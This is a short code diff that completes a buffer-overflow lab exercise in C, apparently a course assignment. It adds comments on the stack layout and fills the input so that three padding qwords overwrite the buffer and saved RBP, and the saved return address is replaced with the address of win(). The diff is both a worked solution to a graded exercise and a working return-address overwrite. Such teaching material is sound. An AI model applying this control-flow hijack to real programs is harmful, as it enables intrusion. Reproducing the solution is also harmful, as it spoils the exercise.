@@ -34,11 +34,19 @@ void lab_code() {
     memset(your_string, 0xFF, sizeof(your_string));
     your_string[127] = 0x000000000000000A;
 
-    // Part 2A: Fill in your_string such that vulnerable executes win() on exit
+    /*
+     * Stack layout inside vulnerable():
+     *   [0] and [1] overwrite stackbuf[16]
+     *   [2] overwrites saved RBP
+     *   [3] overwrites the saved return address
+     *
+     * So we pad three qwords, then replace the return address with win().
+     */
     your_string[0] = 0xFFFFFFFFFFFFFFFF;
     your_string[1] = 0xFFFFFFFFFFFFFFFF;
     your_string[2] = 0xFFFFFFFFFFFFFFFF;
     your_string[3] = win_address;
 
+    // Returning from vulnerable() now jumps directly to win().
     vulnerable((char *)your_string);
 }
